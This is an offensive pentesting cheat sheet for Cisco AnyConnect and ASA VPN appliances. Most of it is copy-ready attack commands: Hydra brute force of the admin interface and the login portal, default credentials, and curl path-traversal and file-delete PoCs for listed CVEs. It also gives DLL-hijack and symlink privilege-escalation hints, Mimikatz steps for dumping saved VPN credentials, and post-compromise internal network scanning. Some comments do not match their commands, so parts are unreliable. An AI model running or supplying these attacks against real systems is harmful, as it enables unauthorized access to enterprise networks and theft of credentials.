# Cisco AnyConnect / ASA SSL VPN

## What is it?
Cisco AnyConnect Secure Mobility Client — SSL VPN solution backed by Cisco ASA (Adaptive Security Appliance) or FTD (Firepower Threat Defense). Widely deployed in enterprise for remote access. Attack surface includes the ASA management interface, SSL VPN portal, and the AnyConnect client itself.

---

## Ports

| Port | Protocol | Service |
|------|----------|---------|
| 443 | TCP | SSL VPN portal / AnyConnect |
| 8443 | TCP | Alternate SSL VPN portal |
| 4443 | TCP | Alternate ASDM / management |
| 500 | UDP | IKEv1/IKEv2 (IPsec) |
| 4500 | UDP | IPsec NAT-T |
| 443 | UDP | DTLS (AnyConnect over UDP) |

---

## Key Files / Paths

```
# ASA config
show running-config
show version
show crypto ca certificates

# AnyConnect client profiles (Windows)
C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\*.xml
C:\Users\<user>\AppData\Local\Cisco\Cisco AnyConnect Secure Mobility Client\

# AnyConnect client profiles (Linux/macOS)
/opt/cisco/anyconnect/profile/*.xml
~/.cisco/certificates/ca/

# ASA VPN session DB
show vpn-sessiondb anyconnect
show vpn-sessiondb detail anyconnect
```

---

## Enumeration

```bash
# Banner / version grab
curl -sk https://<target>/+CSCOE+/logon.html | grep -i 'version\|cisco\|asa'
curl -sk https://<target>/CACHE/stc/1/index.html

# Check if ASDM accessible
curl -sk https://<target>/admin/public/index.html -o /dev/null -w "%{http_code}"

# Nmap service detection
nmap -sV -p 443,8443,4443 --script ssl-cert,ssl-enum-ciphers <target>

# Check WebVPN portal
curl -sk https://<target>/+webvpn+/index.html
curl -sk https://<target>/+CSCOE+/sess_update.html

# Shodan dork
ssl:"Cisco AnyConnect" http.title:"SSL VPN"
```

---

## ASA Management Interface

```bash
# ASDM brute force (HTTP Basic over HTTPS)
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> https-get /admin/public/index.html

# SSH to ASA management
ssh admin@<target>
# Default creds: admin/admin, cisco/cisco, enable password: cisco

# Enable mode
enable
<enable password>

# Once in — dump config
show running-config
show running-config | grep password
show running-config | grep tunnel-group
show running-config | grep group-policy
```

---

## SSL VPN Portal Attacks

```bash
# Credential brute force via portal POST
# Standard AnyConnect auth endpoint:
curl -sk -X POST https://<target>/+webvpn+/index.html \
  -d "tgroup=&next=&tgcookieset=&username=admin&password=admin&Login=Login"

# Hydra against webform
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <target> https-post-form \
  "/+CSCOE+/logon.html:username=^USER^&password=^PASS^&Login=Login:Login failed"

# Check for CLIENTLESS bookmark traversal (unauthenticated path traversal)
curl -sk "https://<target>/+CSCOE+/files/usr/share/doc/"
```

---

## CVEs

| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2020-3153 | AnyConnect Windows client path traversal — arbitrary file copy as SYSTEM | Local PrivEsc |
| CVE-2020-3556 | AnyConnect IPC channel manipulation — execute arbitrary scripts | Local Code Exec |
| CVE-2021-1585 | AnyConnect DLL hijacking via insecure search path | Local PrivEsc |
| CVE-2023-20178 | AnyConnect Windows privilege escalation via symlink attack | Local PrivEsc |
| CVE-2018-0296 | ASA path traversal — read files without auth | Pre-auth Info Disc |
| CVE-2020-3187 | ASA WebVPN directory traversal — delete/read files | Pre-auth File Read |
| CVE-2022-20713 | ASA clientless SSL VPN XSS | Session Hijack |
| CVE-2023-20269 | ASA/FTD brute force — enumerate valid usernames without lockout | Credential Enum |

---

## CVE-2018-0296 — ASA Path Traversal (Pre-auth)

```bash
# Read /etc/passwd without authentication
curl -sk "https://<target>/+CSCOU+/../+CSCOE+/files/usr/share/doc/OpenSSL/openssl.txt" \
  --path-as-is

# PoC — confirm vulnerable via /+CSCOU+/ traversal
curl -sk "https://<target>/+CSCOU+/../+CSCOE+/files/etc/passwd" --path-as-is

# Check for session token leak
curl -sk "https://<target>/+CSCOE+/session.html" \
  -H "Cookie: webvpnlogin=1; webvpnLang=en"
```

---

## CVE-2020-3187 — ASA WebVPN File Delete/Read

```bash
# Delete a file (PoC — use with care)
curl -sk -X DELETE "https://<target>/+CSCOE+/portal.html" \
  -H "Cookie: webvpnlogin=1"

# File read via traversal
curl -sk "https://<target>/+CSCOU+/../+CSCOE+/files/tmp/.+CSCOE+/session" \
  --path-as-is
```

---

## AnyConnect Client Profile Extraction

Profile XML files store server addresses, authentication settings, and can reveal internal infrastructure.

```bash
# Windows — locate profile files
dir "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\" /s
type "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\vpn_profile.xml"

# Look for:
# <HostAddress> — VPN server FQDNs/IPs (internal naming)
# <Authentication> — certificate vs password
# <ServerList> — all configured VPN gateways
# <AlwaysOn> — if true, split-tunnel is likely disabled
# <BypassDownloader> — misconfig that skips profile updates

# Linux
cat /opt/cisco/anyconnect/profile/*.xml
```

---

## Client-Side Attacks (Post-Phish / Physical Access)

```bash
# CVE-2020-3153 — path traversal as SYSTEM (Windows)
# AnyConnect moves files during update — plant DLL/exe in update path
# Exploit: create symlink in temp dir before AnyConnect processes update

# CVE-2021-1585 — DLL hijacking
# AnyConnect loads DLLs from PATH-searchable locations
# Plant malicious DLL in a writable PATH directory:
# wkscli.dll, samlib.dll, netutils.dll

# CVE-2023-20178 — symlink attack
# Vulnerable: AnyConnect 4.10.x before 4.10.06079
# Creates files in C:\Windows\System32\ via temp directory symlink
# PoC: https://github.com/Wh04m1001/CVE-2023-20178

# Check installed version
reg query "HKLM\SOFTWARE\Cisco\Cisco AnyConnect Secure Mobility Client" /v Version
# or
"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnui.exe" --version
```

---

## Tunnel Group / Group Policy Enumeration

```bash
# Enumerate valid group names via portal (no auth needed — groups shown in dropdown)
curl -sk https://<target>/+CSCOE+/logon.html | grep -i 'group\|tunnel'

# With valid creds — enumerate from ASA CLI
show running-config tunnel-group
show running-config group-policy

# Key config weaknesses:
# - split-tunneling enabled (bypass corporate monitoring)
# - no posture check / hostscan (connect from any device)
# - password-only auth with no MFA
# - tunnel-group with preshared key visible in config
```

---

## Credential Storage

```bash
# AnyConnect stores credentials (Windows) — DPAPI encrypted
# Location:
dir "%APPDATA%\Cisco\Cisco AnyConnect Secure Mobility Client\"
# VPN credentials in credential store — extractable with Mimikatz DPAPI module

# Mimikatz — dump AnyConnect saved creds
privilege::debug
sekurlsa::dpapi
# Then decode blob with dpapi::cred /in:<blob>

# Alternatively — check Windows Credential Manager
cmdkey /list | findstr /i cisco
```

---

## Post-Exploitation (VPN Access)

```bash
# Once connected — discover internal network
ip route show          # split-tunnel routes pushed by ASA
cat /etc/resolv.conf   # internal DNS servers pushed by ASA
nmcli connection show  # tunnel interface details

# Internal DNS resolution reveals target scope
host -l <internal-domain> <dns-server>
nmap -sn <pushed-subnet>/24

# ASA pushes route info in CSTP (Cisco SSL Tunnel Protocol) — inspect headers
curl -sk https://<target>/CACHE/stc/1/index.html -v 2>&1 | grep -i 'X-CSTP'
```

---

## Dangerous Configurations

| Config | Risk |
|--------|------|
| No certificate pinning on client | MITM AnyConnect connections |
| `split-tunnel` enabled | Users route non-VPN traffic outside corporate monitoring |
| `password-only` auth, no MFA | Credential stuffing viable |
| `no tunnel-group lock` | Any group accessible from portal |
| ASDM accessible from internet | Brute force management interface |
| `hostscan` not enforced | Unmanaged devices can connect |
| ASA version < 9.16 | Multiple critical CVEs unpatched |

---

## Quick Reference

```bash
# Version/banner grab
curl -sk https://<target>/+CSCOE+/logon.html | grep -i version

# CVE-2018-0296 path traversal check
curl -sk --path-as-is "https://<target>/+CSCOU+/../+CSCOE+/files/etc/passwd"

# Brute force portal
hydra -l admin -P rockyou.txt <target> https-post-form "/+CSCOE+/logon.html:username=^USER^&password=^PASS^:Login failed"

# Enumerate tunnel groups from portal
curl -sk https://<target>/+CSCOE+/logon.html | grep -i tunnel

# ASA CLI (if creds obtained)
ssh admin@<target>
show running-config
show vpn-sessiondb anyconnect
```
